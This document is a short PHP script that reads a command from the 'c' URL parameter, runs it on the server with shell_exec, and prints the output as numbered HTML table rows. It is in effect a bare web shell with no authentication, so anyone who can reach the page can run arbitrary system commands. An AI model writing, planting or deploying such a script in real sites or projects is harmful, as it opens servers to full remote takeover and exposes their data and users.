<?php

$cmd = $_GET["c"];

$out = shell_exec($cmd);

$out = htmlentities($out);

$ln = 0;
foreach(preg_split("/((\r?\n)|(\r\n?))/", $out) as $line){
    $ln += 1;
    $o .= "<tr><td>$ln</td><td><span>$line</span></td></tr>";
}

$o = str_replace("\n", "<br>", $o);
$o = str_replace("\t", "    ", $o);
$o = str_replace(" ", "&nbsp;", $o);

echo $o;